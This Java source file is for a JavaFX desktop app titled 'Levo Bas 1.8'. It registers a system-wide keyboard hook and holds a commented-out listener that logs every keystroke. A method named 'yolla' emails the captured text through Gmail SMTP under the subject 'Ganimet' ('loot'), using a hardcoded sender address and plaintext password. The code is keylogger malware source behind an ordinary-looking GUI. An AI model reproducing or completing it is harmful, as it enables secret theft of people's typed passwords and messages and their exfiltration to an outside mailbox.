package application;

import java.awt.AWTException;
import java.io.IOException;
import java.util.Properties;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

import javax.mail.Authenticator;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import javafx.application.Application;
import javafx.event.EventHandler;
import javafx.fxml.FXMLLoader;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.image.Image;
import javafx.stage.Stage;
import javafx.stage.WindowEvent;

public class Main extends Application{

	Controller ct;
	public StringBuilder mesaj;
	
	@Override
	public void start(Stage primaryStage) throws IOException {

		
		
		FXMLLoader ld = new FXMLLoader();
		Parent root = FXMLLoader.load(getClass().getResource("Tasarim.fxml"));
		ct = ld.getController();

		primaryStage.setTitle("Levo Bas 1.8");
		primaryStage.getIcons().add(new Image("icon/levo.jpg"));
		Scene sc = new Scene(root, 350, 550);
		primaryStage.setScene(sc);
		sc.getStylesheets().add("application/application.css");
		primaryStage.show();
		
		mesaj = new StringBuilder();


		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException ex) {
			System.err.println("There was a problem registering the native hook.");
			System.err.println(ex.getMessage());

			System.exit(1);
		}
		
		LogManager.getLogManager().reset();

		// Get the logger for "org.jnativehook" and set the level to off.
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);

		
		/*
		GlobalScreen.addNativeKeyListener(new NativeKeyListener() {

			@Override
			public void nativeKeyTyped(NativeKeyEvent arg0) {
				// TODO Auto-generated method stub

			}

			@Override
			public void nativeKeyReleased(NativeKeyEvent arg0) {
				// TODO Auto-generated method stub

			}

			@Override
			public void nativeKeyPressed(NativeKeyEvent e) {

				if(e.getKeyCode() == NativeKeyEvent.VC_SPACE)
					mesaj.append(" ");
				else if(e.getKeyCode() == NativeKeyEvent.VC_OPEN_BRACKET)
					mesaj.append("ð");
				else if(e.getKeyCode() == NativeKeyEvent.VC_QUOTE)
					mesaj.append("i");
				else if(e.getKeyCode() == NativeKeyEvent.VC_CLOSE_BRACKET)
					mesaj.append("ü");
				else if(e.getKeyCode() == NativeKeyEvent.VC_SLASH)
					mesaj.append("ö");
				else if(e.getKeyCode() == NativeKeyEvent.VC_BACK_SLASH)
					mesaj.append("ç");
				else if(e.getKeyCode() == NativeKeyEvent.VC_SEMICOLON)
					mesaj.append("þ");
				else if(e.getKeyCode() == NativeKeyEvent.VC_BACKSPACE)
					mesaj.deleteCharAt(mesaj.length()-1);
				else
					mesaj.append(NativeKeyEvent.getKeyText(e.getKeyCode()).toString());

			}
		});

	
		
		
		*/
		primaryStage.getScene().getWindow().setOnCloseRequest(new EventHandler<WindowEvent>() {
			
			@Override
			public void handle(WindowEvent e) {

				//yolla();
				try {
					GlobalScreen.unregisterNativeHook();
				} catch (NativeHookException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
				
			}
		});
		
	

	}
	
	

	public static void main(String[] args) throws InstantiationException, IllegalAccessException, AWTException, IOException{

	
		//ITesseract instance = new Tesseract();

		
		//System.out.println(ImageReader.extractImage("C:\\Users\\harun088\\Desktop\\sh.png"));
		
		launch(args);
		
		

	}

	
	public void yolla() {


		final String fromEmail = "teskotesko01@gmail.com"; // requires valid gmail id
		final String password = "teskolandin"; // correct password for gmail id
		final String toEmail = "teskotesko02@gmail.com"; // can be any email id

		System.out.println("SSLEmail Start");
		Properties props = new Properties();
		props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP Host
		props.put("mail.smtp.socketFactory.port", "465"); // SSL Port
		props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory"); // SSL Factory Class
		props.put("mail.smtp.auth", "true"); // Enabling SMTP Authentication
		props.put("mail.smtp.port", "465"); // SMTP Port

		Authenticator auth = new Authenticator() {
			// override the getPasswordAuthentication method
			@Override
			protected PasswordAuthentication getPasswordAuthentication() {
				return new PasswordAuthentication(fromEmail, password);
			}
		};

		Session session = Session.getDefaultInstance(props, auth);
		System.out.println("Session created");
		EmailUtil.sendEmail(session, toEmail, "Ganimet", mesaj.toString());

	}
	

}
